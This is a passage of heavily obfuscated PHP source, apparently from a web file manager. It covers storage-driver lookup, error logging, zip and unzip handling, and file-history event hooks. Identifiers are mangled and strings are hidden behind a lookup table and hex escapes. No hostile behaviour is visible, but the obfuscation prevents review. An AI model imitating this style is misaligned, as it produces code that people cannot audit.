Action($•„çö„[1228])->sharePathInfo($¸Î¡ò¼ª[$•„çö„[87]]); $§ÄêÙ§Â = $œƒ¤²®°[$•„çö„[184]]; if (!$œƒ¤²®°[$•„çö„[184]]) { $¢£çÌÁ² = Model($•„çö„[639])->getInfo($œƒ¤²®°[$•„çö„[640]]); $§ÄêÙ§Â = KodIO::clear($¢£çÌÁ²[$•„çö„[1229]] . $¸Î¡ò¼ª[$•„çö„[1222]]); $¸Î¡ò¼ª[$•„çö„[536]] = $¢£çÌÁ²; $¸Î¡ò¼ª[$•„çö„[1204]] = $§ÄêÙ§Â; $œö¿«ˆè = array($•„çö„[1224] => $•„çö„[1230], $•„çö„[6] => $¸Î¡ò¼ª); } break; case KodIO::KOD_SHARE_ITEM: $œö¿«ˆè = array($•„çö„[1224] => $•„çö„[1231], $•„çö„[6] => $¸Î¡ò¼ª); $¢£çÌÁ² = Model($•„çö„[639])->getInfo($¸Î¡ò¼ª[$•„çö„[450]]); if ($¢£çÌÁ²[$•„çö„[184]] == $•„çö„[219]) { $§ÄêÙ§Â = KodIO::clear($¢£çÌÁ²[$•„çö„[1229]] . $¸Î¡ò¼ª[$•„çö„[1222]]); $¸Î¡ò¼ª[$•„çö„[536]] = $¢£çÌÁ²; $¸Î¡ò¼ª[$•„çö„[1204]] = $§ÄêÙ§Â; $œö¿«ˆè = array($•„çö„[1224] => $•„çö„[1232], $•„çö„[6] => $¸Î¡ò¼ª); } else { if (!$§ÄêÙ§Â) { $§ÄêÙ§Â = $¢£çÌÁ²[$•„çö„[184]]; } } break; default: $§ÄêÙ§Â = $¸Î¡ò¼ª[$•„çö„[87]]; $œö¿«ˆè = array($•„çö„[1224] => $•„çö„[1233]); break; } $Äš’¯“ = $¸Î¡ò¼ª[$•„çö„[87]]; if (!isset(self::$driverCache[$Äš’¯“])) { $…áØ¯¸ı = strtolower($œö¿«ˆè[$•„çö„[98]]); $¯ŒÚ·µ¢ = $GLOBALS[$•„çö„[6]][$•„çö„[92]][$•„çö„[870]]; $ ğî£Ğ = $•„çö„[77] . (isset($¯ŒÚ·µ¢[$…áØ¯¸ı]) ? $¯ŒÚ·µ¢[$…áØ¯¸ı] : ucfirst($…áØ¯¸ı)); if (!class_exists($ ğî£Ğ)) { show_json("{$ ğî£Ğ}\x20\x6e\x6f\x74\40\145\170\151\x73\164\x73\x21", !1); } $ËÆôµæ¥ = isset($œö¿«ˆè[$•„çö„[6]]) ? $œö¿«ˆè[$•„çö„[6]] : !1; self::$driverCache[$Äš’¯“] = new $ ğî£Ğ($ËÆôµæ¥); } $ÅÜ‹‡½ = self::$driverCache[$Äš’¯“]; $ÅÜ‹‡½->pathDriver = $”ØÀÈ€ê; $ÅÜ‹‡½->pathBase = $•„çö„[12]; if (isset($œö¿«ˆè[$•„çö„[6]][$•„çö„[1234]])) { $ÅÜ‹‡½->pathBase = rtrim($œö¿«ˆè[$•„çö„[6]][$•„çö„[1234]], $•„çö„[8]) . $•„çö„[8]; $§ÄêÙ§Â = $ÅÜ‹‡½->pathBase . ltrim($§ÄêÙ§Â, $•„çö„[8]); } $§ÄêÙ§Â = $ÅÜ‹‡½->getPath($§ÄêÙ§Â); if (isset($¸Î¡ò¼ª[$•„çö„[1204]])) { $§ÄêÙ§Â = $¸Î¡ò¼ª[$•„çö„[1204]]; } $ÅÜ‹‡½->path = $§ÄêÙ§Â; return $ÅÜ‹‡½; } public static function errorTips($âğ´ºœí = false) { $¯’ÄğÜí =& $_SERVER[³à¼î¯á]; static $Ïœº·é = array(); $ùàŠßŒù = 1000; if ($âğ´ºœí === -1) { return $Ïœº·é ? $Ïœº·é[count($Ïœº·é) - 1] : $¯’ÄğÜí[12]; } if ($âğ´ºœí === !1) { return implode($¯’ÄğÜí[253], $Ïœº·é); } if (count($Ïœº·é) >= $ùàŠßŒù) { $Ïœº·é = array_slice($Ïœº·é, $ùàŠßŒù * 0.5, $ùàŠßŒù); } $Ïœº·é[] = $âğ´ºœí; write_log($¯’ÄğÜí[166] . ACTION . $¯’ÄğÜí[1235] . $âğ´ºœí, $¯’ÄğÜí[1236]); } public static function getLastError($ÁŒÖÔš = '') { $¦«Ş›ß = self::errorTips(-1); return $¦«Ş›ß ? $¦«Ş›ß : $ÁŒÖÔš; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $½ûò®¸ü; if ($½ûò®¸ü) { return $½ûò®¸ü; } $“Œ†ÖëÄ = IO::init($_SERVER[³à¼î¯á][8]); return $“Œ†ÖëÄ; } private static function iconvSystem($´öŞÂ˜´) { return self::local()->iconvSystem($´öŞÂ˜´); } private static function iconvApp($®ìôÄÒƒ) { return self::local()->iconvApp($®ìôÄÒƒ); } public static function zipFolder($­Åå«Ğ´, $‘·¤¬éå = "\172\151\x70", $…Á˜½½ì = '', $¾ÌôÂòÇ = REPEAT_RENAME) { $Ö¬”ÏÙİ =& $_SERVER[³à¼î¯á]; $ƒñ¯Õà« = IO::listPath($­Åå«Ğ´); if (!$ƒñ¯Õà«) { return !1; } $ƒñ¯Õà« = array_merge($ƒñ¯Õà«[$Ö¬”ÏÙİ[85]], $ƒñ¯Õà«[$Ö¬”ÏÙİ[86]]); return self::zip($ƒñ¯Õà«, $‘·¤¬éå, $…Á˜½½ì, $¾ÌôÂòÇ); } public static function zip($ÂˆÑØîª, $ô»é¯Ö© = "\x7a\151\x70", $æèòÅÊ¿ = '', $ù¨ù— = REPEAT_RENAME) { $Æ®¦¢–  =& $_SERVER[³à¼î¯á]; if (is_string($ÂˆÑØîª) && $ÂˆÑØîª) { $ÂˆÑØîª = array(array($Æ®¦¢– [87] => $ÂˆÑØîª)); } $Å·­¶Èó = self::init($ÂˆÑØîª[0][$Æ®¦¢– [87]]); $Œôí‰¤ó = self::info($ÂˆÑØîª[0][$Æ®¦¢– [87]]); $Ù¡š¿‹ˆ = $Æ®¦¢– [12]; $²Éö Ä· = $Æ®¦¢– [12]; $›³ÂğÊÎ = $Æ®¦¢– [12]; if ($æèòÅÊ¿ && substr($æèòÅÊ¿, -1, 1) != $Æ®¦¢– [8]) { $²Éö Ä· = get_path_father($æèòÅÊ¿); $›³ÂğÊÎ = get_path_this($æèòÅÊ¿); } else { $²Éö Ä· = self::pathFather($Œôí‰¤ó[$Æ®¦¢– [87]]); $›³ÂğÊÎ = $Œôí‰¤ó[$Æ®¦¢– [32]] . $Æ®¦¢– [10] . $ô»é¯Ö©; if (count($ÂˆÑØîª) > 1) { $ğ©ˆÂœ = IO::info($²Éö Ä·); $›³ÂğÊÎ = $ğ©ˆÂœ[$Æ®¦¢– [32]] . $Æ®¦¢– [10] . $ô»é¯Ö©; } if ($æèòÅÊ¿) { $²Éö Ä· = $æèòÅÊ¿; } } if ($Å·­¶Èó->getType() == $Æ®¦¢– [109]) { $È¦‡ µ = self::init($²Éö Ä·); $±ì¤ÅÓ = $È¦‡ µ->getType() == $Æ®¦¢– [109] ? $²Éö Ä· : get_path_father($Å·­¶Èó->path); $±ì¤ÅÓ = rtrim($±ì¤ÅÓ, $Æ®¦¢– [8]) . $Æ®¦¢– [8]; mk_dir($±ì¤ÅÓ); } else { $Ù¡š¿‹ˆ = TEMP_FILES . $Æ®¦¢– [1237] . time() . rand_string(8) . $Æ®¦¢– [8]; mk_dir($Ù¡š¿‹ˆ); file_put_contents($Ù¡š¿‹ˆ . $Æ®¦¢– [1238], $Æ®¦¢– [12]); $±ì¤ÅÓ = $Ù¡š¿‹ˆ; } $ÊÌ¤¯½– = IO::info($±ì¤ÅÓ); if (!$ÊÌ¤¯½– || !$ÊÌ¤¯½–[$Æ®¦¢– [224]]) { show_json(LNG($Æ®¦¢– [1239]), !1); } $ñÚü‡Ëâ = self::zipFileList($ÂˆÑØîª, $Ù¡š¿‹ˆ); foreach ($ñÚü‡Ëâ as $ÍŠÑØ„Ä => $“¹…ß½Ş) { $ñÚü‡Ëâ[$ÍŠÑØ„Ä] = self::iconvSystem($“¹…ß½Ş); } $ûÇûÈ» = get_filename_auto($±ì¤ÅÓ . $›³ÂğÊÎ, $Æ®¦¢– [12], $ù¨ù—); KodArchive::create(self::iconvSystem($ûÇûÈ»), $ñÚü‡Ëâ); if (!IO::exist($ûÇûÈ»)) { if ($Ù¡š¿‹ˆ) { del_dir($Ù¡š¿‹ˆ); } show_json(LNG($Æ®¦¢– [1240]), !1); } if (!$Ù¡š¿‹ˆ) { return $ûÇûÈ»; } $Èğ‰İ˜À = self::move($ûÇûÈ», $²Éö Ä·, $ù¨ù—); if ($Ù¡š¿‹ˆ) { del_dir($Ù¡š¿‹ˆ); } if (!$ûÇûÈ») { show_json(LNG($Æ®¦¢– [1240]), !1); } return $Èğ‰İ˜À; } public static function unzip($„¦‡Ø…ì, $¥ò±ÍŞÕ, $ìÀÑÀ†ü = "\x2d\61", $ÉË¶Şú¯ = "\x72\145\160\154\x61\143\x65") { $ŠüÄ°²Û =& $_SERVER[³à¼î¯á]; $Óˆ´ÂöÆ = parent::info($„¦‡Ø…ì); if (!$Óˆ´ÂöÆ) { show_json(LNG($ŠüÄ°²Û[1241]), !1); } $—­åæûç = IO::infoFullSimple($¥ò±ÍŞÕ); if (!$—­åæûç) { $¥ò±ÍŞÕ = IO::mkdir($¥ò±ÍŞÕ); } if (isset($—­åæûç[$ŠüÄ°²Û[184]]) && trim($—­åæûç[$ŠüÄ°²Û[87]], $ŠüÄ°²Û[8]) != trim($¥ò±ÍŞÕ, $ŠüÄ°²Û[8])) { $Ì‚Í¤î´ = KodIO::make($—­åæûç[$ŠüÄ°²Û[183]]); $•Õ®òœ® = IO::fileNameAuto($Ì‚Í¤î´, $—­åæûç[$ŠüÄ°²Û[32]], REPEAT_RENAME_FOLDER, !0); $¥ò±ÍŞÕ = IO::mkdir($Ì‚Í¤î´ . $•Õ®òœ®); } $ìÀÑÀ†ü = $ìÀÑÀ†ü && $ìÀÑÀ†ü != $ŠüÄ°²Û[1242] ? @json_decode($ìÀÑÀ†ü, !0) : -1; $úæ–…À = self::unzipPart($„¦‡Ø…ì, $ìÀÑÀ†ü); if (!$úæ–…À || !IO::exist($úæ–…À[$ŠüÄ°²Û[221]])) { show_json(LNG($ŠüÄ°²Û[108]), !1); } $½Ñíû´‘ = $úæ–…À[$ŠüÄ°²Û[1243]][count($úæ–…À[$ŠüÄ°²Û[1243]]) - 1]; if ($½Ñíû´‘[$ŠüÄ°²Û[1244]] == -1 || substr($½Ñíû´‘[$ŠüÄ°²Û[32]], -1, 1) == $ŠüÄ°²Û[8]) { $Êš¨ïÌ  = $úæ–…À[$ŠüÄ°²Û[1245]] . rand_string(10) . $ŠüÄ°²Û[8]; mk_dir($Êš¨ïÌ ); $·Ç‘áª = count($úæ–…À[$ŠüÄ°²Û[1243]]) == 1 ? IO::ext($„¦‡Ø…ì) : get_path_ext($úæ–…À[$ŠüÄ°²Û[221]]); $‘™ßş˜ = KodArchive::extract(self::iconvSystem($úæ–…À[$ŠüÄ°²Û[221]]), $Êš¨ïÌ , $½Ñíû´‘[$ŠüÄ°²Û[1244]], $•Õ®òœ®, $·Ç‘áª); self::unzipErrorCheck($‘™ßş˜, array($ŠüÄ°²Û[1246], $„¦‡Ø…ì, $·Ç‘áª, $¥ò±ÍŞÕ, $úæ–…À)); Hook::trigger($ŠüÄ°²Û[1247], $Êš¨ïÌ ); recursion_dir($Êš¨ïÌ , $“úıàÅü, $äîßçšØ, 0); $ë‡µõÎ’ = array_merge($“úıàÅü, $äîßçšØ); $À½›Ãõ· = array(); foreach ($ë‡µõÎ’ as $ãìÕì‚) { $Ğ«®ò¿¾ = IO::move(self::iconvApp($ãìÕì‚), $¥ò±ÍŞÕ, $ÉË¶Şú¯); if ($Ğ«®ò¿¾) { $À½›Ãõ·[] = $Ğ«®ò¿¾; } } del_dir($Êš¨ïÌ ); } else { $Ğ«®ò¿¾ = IO::move($úæ–…À[$ŠüÄ°²Û[221]], $¥ò±ÍŞÕ, $ÉË¶Şú¯, get_path_this($½Ñíû´‘[$ŠüÄ°²Û[32]])); if ($Ğ«®ò¿¾) { $À½›Ãõ·[] = $Ğ«®ò¿¾; } } return $À½›Ãõ· ? $À½›Ãõ· : !1; } public static function unzipList($ê‡«Å) { $»—¿ÂàË =& $_SERVER[³à¼î¯á]; $ùøçèâŒ = isset($ê‡«Å[$»—¿ÂàË[1248]]) ? $ê‡«Å[$»—¿ÂàË[1248]] : !1; $÷‡¯úê˜ = isset($ê‡«Å[$»—¿ÂàË[1244]]) ? @json_decode($ê‡«Å[$»—¿ÂàË[1244]], !0) : -1; $ÓÅ‡Ì«§ = self::unzipPart($ê‡«Å[$»—¿ÂàË[87]], $÷‡¯úê˜); if (!$ÓÅ‡Ì«§ || !IO::exist($ÓÅ‡Ì«§[$»—¿ÂàË[221]])) { show_json(LNG($»—¿ÂàË[108]), !1); } $œÓ™è¨ = $ÓÅ‡Ì«§[$»—¿ÂàË[1243]][count($ÓÅ‡Ì«§[$»—¿ÂàË[1243]]) - 1]; $ß°¸á± = in_array(IO::ext($ÓÅ‡Ì«§[$»—¿ÂàË[221]]), array($»—¿ÂàË[364], $»—¿ÂàË[1249], $»—¿ÂàË[1250], $»—¿ÂàË[1251], $»—¿ÂàË[1252], $»—¿ÂàË[1253])); if (!$ùøçèâŒ && ($œÓ™è¨[$»—¿ÂàË[1244]] == -1 || $ß°¸á±)) { $…Ñ‰¥À = $ÓÅ‡Ì«§[$»—¿ÂàË[1245]] . get_path_this($ÓÅ‡Ì«§[$»—¿ÂàË[221]]) . $»—¿ÂàË[1254]; if (!IO::exist($…Ñ‰¥À)) { $„©Í¹ªĞ = $œÓ™è¨[$»—¿ÂàË[1244]] == -1 ? get_path_ext(IO::pathThis($ê‡«Å[$»—¿ÂàË[87]])) : get_path_ext($ÓÅ‡Ì«§[$»—¿ÂàË[221]]); $ß¯Úç¢† = KodArchive::listContent(self::iconvSystem($ÓÅ‡Ì«§[$»—¿ÂàË[221]]), !0, $„©Í¹ªĞ); self::unzipErrorCheck($ß¯Úç¢†, array($»—¿ÂàË[1255], $ê‡«Å, $ÓÅ‡Ì«§)); @file_put_contents($…Ñ‰¥À, json_encode($ß¯Úç¢†[$»—¿ÂàË[1256]])); } return @json_decode(IO::getContent($…Ñ‰¥À), !0); } IO::fileOut($ÓÅ‡Ì«§[$»—¿ÂàË[221]], $ùøçèâŒ, get_path_this($œÓ™è¨[$»—¿ÂàË[32]])); die; } private static function zipFileList($ÅõìØĞ¹, $Ÿ°Ã°ã = false) { $Æ«Ûü‰ =& $_SERVER[³à¼î¯á]; $èŠÒ’Õè = array(); foreach ($ÅõìØĞ¹ as $çÉœÕ¸õ) { $ÏãÒâÕ× = $çÉœÕ¸õ[$Æ«Ûü‰[87]]; if ($Ÿ°Ã°ã) { $ÏãÒâÕ× = self::copy($çÉœÕ¸õ[$Æ«Ûü‰[87]], $Ÿ°Ã°ã, $Æ«Ûü‰[862]); } else { $×´’ôƒš = self::init($çÉœÕ¸õ[$Æ«Ûü‰[87]]); if ($×´’ôƒš->getType() == $Æ«Ûü‰[109]) { $ÏãÒâÕ× = $×´’ôƒš->path; } } if ($ÏãÒâÕ× && self::local()->exist($ÏãÒâÕ×)) { $èŠÒ’Õè[$çÉœÕ¸õ[$Æ«Ûü‰[87]]] = $ÏãÒâÕ×; } } if (!empty($èŠÒ’Õè)) { return array_values($èŠÒ’Õè); } show_json(LNG($Æ«Ûü‰[1218]), !1); } private static function localFilePath($Ô¶Ê¼ŒÑ) { $ş»ùØÖ¹ =& $_SERVER[³à¼î¯á]; $–Ã¦¸‡â = KodIO::parse($Ô¶Ê¼ŒÑ); if ($–Ã¦¸‡â[$ş»ùØÖ¹[33]] == KodIO::KOD_SOURCE) { $íµ•ŒÆ˜ = Model($ş»ùØÖ¹[869])->fileInfoGet(KodIO::sourceID($Ô¶Ê¼ŒÑ)); if (!$íµ•ŒÆ˜[$ş»ùØÖ¹[87]]) { show_json($ş»ùØÖ¹[1257], !1); } $Ô¶Ê¼ŒÑ = $íµ•ŒÆ˜[$ş»ùØÖ¹[87]]; } $İ¥¼¶îÓ = self::init($Ô¶Ê¼ŒÑ); if ($İ¥¼¶îÓ->pathParse[$ş»ùØÖ¹[1204]]) { $Ô¶Ê¼ŒÑ = $İ¥¼¶îÓ->pathParse[$ş»ùØÖ¹[1204]]; $İ¥¼¶îÓ = self::init($Ô¶Ê¼ŒÑ); } $Ñ£ä§ä  = $İ¥¼¶îÓ->getType(); if ($Ñ£ä§ä  == $ş»ùØÖ¹[109] || $Ñ£ä§ä  == $ş»ùØÖ¹[1258]) { if (!$İ¥¼¶îÓ->exist($İ¥¼¶îÓ->path)) { show_json(LNG($ş»ùØÖ¹[108]), !1); } return $İ¥¼¶îÓ->path; } return !1; } public static function unzipPart($ÚŞ›³ì, $¸àê¤Íª = -1) { $èóìÖÆ‹ =& $_SERVER[³à¼î¯á]; $«½åşÒ€ = IO::pathThis($ÚŞ›³ì); if (!$¸àê¤Íª || $¸àê¤Íª == -1) { $½´Ğ¡õ = array(array($èóìÖÆ‹[32] => $«½åşÒ€, $èóìÖÆ‹[1244] => -1)); $½´Ğ¡õ[0][$èóìÖÆ‹[1259]] = $½´Ğ¡õ[0][$èóìÖÆ‹[32]]; } else { if (is_array($¸àê¤Íª)) { $½´Ğ¡õ = $¸àê¤Íª; $ÁÛ¦¦ó‰ = count($½´Ğ¡õ) - 1; for ($›÷Ûôì® = 0; $›÷Ûôì® <= $ÁÛ¦¦ó‰; $›÷Ûôì®++) { $ªŞ¿²÷ = $½´Ğ¡õ[$›÷Ûôì®]; $¤‡ƒ÷Ò = get_path_this($ªŞ¿²÷[$èóìÖÆ‹[32]]) . (checkExtSafe($ªŞ¿²÷[$èóìÖÆ‹[32]]) ? $èóìÖÆ‹[12] : $èóìÖÆ‹[1260]); $½´Ğ¡õ[$›÷Ûôì®][$èóìÖÆ‹[1259]] = $èóìÖÆ‹[1261] . intval($ªŞ¿²÷[$èóìÖÆ‹[1244]]) . $èóìÖÆ‹[437] . $¤‡ƒ÷Ò; if ($›÷Ûôì® == 0) { continue; } $½´Ğ¡õ[$›÷Ûôì®][$èóìÖÆ‹[1259]] = $½´Ğ¡õ[$›÷Ûôì® - 1][$èóìÖÆ‹[1259]] . $èóìÖÆ‹[1262] . $½´Ğ¡õ[$›÷Ûôì®][$èóìÖÆ‹[1259]]; } } } if (!is_array($½´Ğ¡õ) || count($½´Ğ¡õ) == 0) { return !1; } $üù”•Çà = $½´Ğ¡õ[count($½´Ğ¡õ) - 1]; if (!IO::exist($ÚŞ›³ì)) { return !1; } $½Ü¡çÛ° = TEMP_FILES . $èóìÖÆ‹[1263] . kodIO::hashPathSafe($ÚŞ›³ì) . $èóìÖÆ‹[8]; $ßå„®Ú = $½Ü¡çÛ° . $üù”•Çà[$èóìÖÆ‹[1259]]; mk_dir($½Ü¡çÛ°); file_put_contents(TEMP_FILES . $èóìÖÆ‹[1238], $èóìÖÆ‹[12]); if (IO::exist($ßå„®Ú)) { return array($èóìÖÆ‹[221] => $ßå„®Ú, $èóìÖÆ‹[1243] => $½´Ğ¡õ, $èóìÖÆ‹[1245] => $½Ü¡çÛ°); } $Òô­ñªã = self::localFilePath($ÚŞ›³ì); if (!$Òô­ñªã) { $Òô­ñªã = $½Ü¡çÛ° . $èóìÖÆ‹[1264]; if (!IO::exist($Òô­ñªã)) { self::copy($ÚŞ›³ì, $½Ü¡çÛ°, !1, get_path_this($Òô­ñªã)); } } if (!$Òô­ñªã || !IO::exist($Òô­ñªã)) { return !1; } if ($üù”•Çà[$èóìÖÆ‹[1244]] == -1) { return array($èóìÖÆ‹[221] => $Òô­ñªã, $èóìÖÆ‹[1243] => $½´Ğ¡õ, $èóìÖÆ‹[1245] => $½Ü¡çÛ°); } $²‚­ŞÑî = $Òô­ñªã; foreach ($½´Ğ¡õ as $›÷Ûôì® => $ªŞ¿²÷) { if (!$ªŞ¿²÷ || $ªŞ¿²÷[$èóìÖÆ‹[1244]] == $èóìÖÆ‹[1242]) { break; } if (substr($ªŞ¿²÷[$èóìÖÆ‹[32]], -1, 1) == $èóìÖÆ‹[8]) { break; } $ £ËîÛ = in_array(get_path_ext($ªŞ¿²÷[$èóìÖÆ‹[1259]]), array($èóìÖÆ‹[364], $èóìÖÆ‹[1249], $èóìÖÆ‹[1250], $èóìÖÆ‹[1251], $èóìÖÆ‹[1252], $èóìÖÆ‹[1253])); $õ±Ç¸èŞ = $›÷Ûôì® == count($½´Ğ¡õ) - 1 && $ £ËîÛ; $ÅÔùƒ = $½Ü¡çÛ° . $ªŞ¿²÷[$èóìÖÆ‹[1259]]; $ÑğÁÈÂ = $½Ü¡çÛ° . get_path_this($ªŞ¿²÷[$èóìÖÆ‹[32]]); if (IO::exist($ÅÔùƒ)) { $²‚­ŞÑî = $ÅÔùƒ; continue; } $åïÅ²Ğß = $›÷Ûôì® == 0 ? get_path_ext($«½åşÒ€) : get_path_ext($²‚­ŞÑî); $•ÛßöÑ˜ = KodArchive::extract(self::iconvSystem($²‚­ŞÑî), $½Ü¡çÛ°, $ªŞ¿²÷[$èóìÖÆ‹[1244]], $’Ü¶Ï€‹, $åïÅ²Ğß); self::unzipErrorCheck($•ÛßöÑ˜, array($èóìÖÆ‹[1265], $ÚŞ›³ì, $½´Ğ¡õ, $ªŞ¿²÷, $ÅÔùƒ)); if (IO::exist($ÑğÁÈÂ)) { IO::rename($ÑğÁÈÂ, get_path_this($ÅÔùƒ)); } $²‚­ŞÑî = $ÅÔùƒ; } $ßå„®Ú = $²‚­ŞÑî; return array($èóìÖÆ‹[221] => $²‚­ŞÑî, $èóìÖÆ‹[1243] => $½´Ğ¡õ, $èóìÖÆ‹[1245] => $½Ü¡çÛ°); } private static function unzipErrorCheck($³Ô¶˜îä, $…ÔŠˆˆ = false) { $û‡†¼ñÆ =& $_SERVER[³à¼î¯á]; if ($³Ô¶˜îä[$û‡†¼ñÆ[1266]]) { return !0; } write_log(array($û‡†¼ñÆ[1267], $³Ô¶˜îä, $…ÔŠˆˆ), $û‡†¼ñÆ[1268]); show_json($û‡†¼ñÆ[1269] . json_encode($³Ô¶˜îä[$û‡†¼ñÆ[1256]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $şÏËşÜ =& $_SERVER[³à¼î¯á]; $‘ÅàĞÙÏ = $GLOBALS[$şÏËşÜ[6]][$şÏËşÜ[92]]; if ($‘ÅàĞÙÏ[$şÏËşÜ[1270]] != 1) { return; } if ($‘ÅàĞÙÏ[$şÏËşÜ[1271]] <= 0) { return; } if (isset($_REQUEST[$şÏËşÜ[1272]]) && $_REQUEST[$şÏËşÜ[1272]] == $şÏËşÜ[91]) { return; } Hook::bind($şÏËşÜ[1273], $şÏËşÜ[1274]); Hook::bind($şÏËşÜ[1275], $şÏËşÜ[1276]); Hook::bind($şÏËşÜ[1277], $şÏËşÜ[1278]); Hook::bind($şÏËşÜ[1279], $şÏËşÜ[1280]); Hook::bind($şÏËşÜ[1281], $şÏËşÜ[1282]); Hook::bind($şÏËşÜ[1283], $şÏËşÜ[1284]); } public static function eventBeforeUpload($ß¶÷÷Â—) { if ($ß¶÷÷Â—[3] && $ß¶÷÷Â—[3] != REPEAT_REPLACE) { return; } $¨€É¯à = self::parsePath($ß¶÷÷Â—[0]); if (!$¨€É¯à) { return; } self::add($¨€É¯à); } public static function eventBeforeEdit($²¼¸ó) { $—Æ³¬ƒ¼ = self::parsePath($²¼¸ó[0]); if (!$—Æ³¬ƒ¼) { return; } self::add($—Æ³¬ƒ¼); } public static function eventBeforeCopyFile($¤Äö—‡, $çÄ¦§Å, $ç¼¥ğ´¹, $¾“ºŠŒ¼, $‹¥ıåó, $ÉÜ¡œ¸) { $Å«á‹ôâ =& $_SERVER[³à¼î¯á]; if (isset($ç¼¥ğ´¹->_data[$Å«á‹ôâ[1208]]) && $ç¼¥ğ´¹->_data[$Å«á‹ôâ[1208]]) { return; } $ş¬çºõ‰ = $ç¼¥ğ´¹->getPathOuter($¾“ºŠŒ¼); $”±¦»â = self::parsePath($ş¬çºõ‰); if (!$”±¦»â) { return; } self::add($”±¦»â); } public static function eventBeforeRename($”×î¢™Ü) { $ÍâèÒÄ =& $_SERVER[³à¼î¯á]; $æÈì´ = self::parsePath($”×î¢™Ü[0]); if (!$æÈì´) { return; } $í«¯Àßâ = self::checkInHistory($æÈì´); if (!$í«¯Àßâ) { return; } if ($í«¯Àßâ[$ÍâèÒÄ[33]] == $ÍâèÒÄ[221]) { $ÏÉˆí = self::listData($æÈì´); if ($ÏÉˆí && $ÏÉˆí[$ÍâèÒÄ[420]]) { self::moveHistory($æÈì´, $”×î¢™Ü[1]); } } else { IO::rename($í«¯Àßâ[$ÍâèÒÄ[87]], $”×î¢™Ü[1]); } } public static function eventBeforeMove($îÎê‡Ó) { $”õßŸ—» =& $_SERVER[³à¼î¯á]; $Ò§è¢™× = self::parsePath($îÎê‡Ó[0]); if (!$Ò§è¢™×) { return; } $‹¾¿Ø = self::parsePath($îÎê‡Ó[1]); if (!$‹¾¿Ø) { return; } $Å’ß½Àö = $îÎê‡Ó[3]; $Ãä±Ü”¢ = self::checkInHistory($Ò§è¢™×); if (!$Ãä±Ü”¢) { return; } $ˆ¹İè = self::pathHistory($‹¾¿Ø); if ($Ãä±Ü”¢[$”õßŸ—»[33]] == $”õßŸ—»[221]) { $¨Ã†õÛ™ = self::listData($Ò§è¢™×); $Ùæ§»£­ = rtrim($‹¾¿Ø, $”õßŸ—»[8]) . $”õßŸ—»[8] . ($Å’ß½Àö ? $Å’ß½Àö : get_path_this($Ò§è¢™×)); $À¾å¥ä = self::listData($Ùæ§»£­); if ($¨Ã†õÛ™ && $¨Ã†õÛ™[$”õßŸ—»[420]] && $À¾å¥ä && $À¾å¥ä[$”õßŸ—»[420]]) { return self::clear($Ò§è¢™×); } if ($¨Ã†õÛ™ && $¨Ã†õÛ™[$”õßŸ—»[420]]) { self::moveHistory($Ò§è¢™×, $Å’ß½Àö, $ˆ¹İè); } } else { IO::move($Ãä±Ü”¢[$”õßŸ—»[87]], $ˆ¹İè, !1, $Å’ß½Àö); self::clearEmptyFolder(IO::pathFather($Ãä±Ü”¢[$”õßŸ—»[87]])); } } public static function eventAfterRemove($µÁşÌ¢”, $üš÷ÜÕö) { $Ôüà¡æ =& $_SERVER[³à¼î¯á]; if (!$üš÷ÜÕö) { return; } $ıË¬¡Õ = self::parsePath($µÁşÌ¢”[0]); if (!$ıË¬¡Õ) { return; } $èÂ‡ˆ‹‘ = self::checkInHistory($ıË¬¡Õ); if (!$èÂ‡ˆ‹‘) { return; } if ($èÂ‡ˆ‹‘[$Ôüà¡æ[33]] == $Ôüà¡æ[221]) { $ò†öú½„ = self::listData($ıË¬¡Õ, !1); if ($ò†öú½„ && $ò†öú½„[$Ôüà¡æ[420]]) { self::clear($ıË¬¡Õ, !1); } } else { IO::remove($èÂ‡ˆ‹‘[$Ôüà¡æ[87]]); self::clearEmptyFolder(IO::pathFather($èÂ‡ˆ‹‘[$Ôüà¡æ[87]])); } } private static function checkInHistory($ŸÔ½°³) { $‡Ñ³ñ ı = self::pathHistory($ŸÔ½°³); if (!IO::exist($‡Ñ³ñ ı)) { $‡Ñ³ñ ı .= $_SERVER[³à¼î¯á][1285]; } return IO::exist($‡Ñ³ñ ı) ? IO::info($‡Ñ³ñ ı) : !1; } private static function parsePath($üŞ àç) { $ß¸ñ¼ğ =& $_SERVER[³à¼î¯á]; if (!$üŞ àç) { return !1; } if (isset($GLOBALS[$ß¸ñ¼ğ[1286]]) && $GLOBALS[$ß¸ñ¼ğ[1286]]) { return; } $Šë¢‹ï¤ = KodIO::parse($üŞ àç); $ø©øºò€ = $Šë¢‹ï¤[$ß¸ñ¼ğ[33]]; $Ë¶½ü“İ = !$ø©øºò€ || $ø©øºò€ == KodIO::KOD_IO || $ø©øºò€ == KodIO::KOD_SHARE_ITEM; if (!$Ë¶½ü“İ || !$Šë¢‹ï¤[$ß¸ñ¼ğ[1287]]) { return !1; } if (substr($üŞ àç, 0, strlen(DATA_PATH . $ß¸ñ¼ğ[1288])) == DATA_PATH . $ß¸ñ¼ğ[1288]) { return !1; } if ($ø©øºò€ == KodIO::KOD_SHARE_ITEM) { $½Œé±’ù = IO::init($üŞ àç); if ($½Œé±’ù->pathParse[$ß¸ñ¼ğ[1204]]) { return self::parsePath($½Œé±’ù->pathParse[$ß¸ñ¼ğ[1204]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ã©Ìãé = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ß¸ñ¼ğ[1289]); foreach ($ã©Ìãé as $ß¶—Ô’Ÿ) { if (!$ø©øºò€ && substr($üŞ àç, 0, strlen($ß¶—Ô’Ÿ)) == $ß¶—Ô’Ÿ) { return !1; } } self::log($GLOBALS[$ß¸ñ¼ğ[1199]] . $ß¸ñ¼ğ[1290] . $üŞ àç); return $üŞ àç; } private static function pathHistory($íçÙªÀ) { $Õ¬³Ğ†Ñ =& $_SERVER[³à¼î¯á]; $Í¨‘×âı = self::$_historyBase . ltrim(KodIO::clear($íçÙªÀ), $Õ¬³Ğ†Ñ[8]); $Í¨‘×âı = str_replace(array($Õ¬³Ğ†Ñ[1291]), array($Õ¬³Ğ†Ñ[1292]), $Í¨‘×âı); return $Í¨‘×âı; } public static function log($ú¾ø¨Û¤) { } public static function historyCount($ÍÈ¡û›©) { $›‘¡Å„ =& $_SERVER[³à¼î¯á]; $·±¿üÜŸ = array(); $×í÷û—† = array(); foreach ($ÍÈ¡û›© as $«ÑÛäÌÛ) { $‘¼ä»× = get_path_father($«ÑÛäÌÛ); if (!$×í÷û—†[$‘¼ä»×]) { 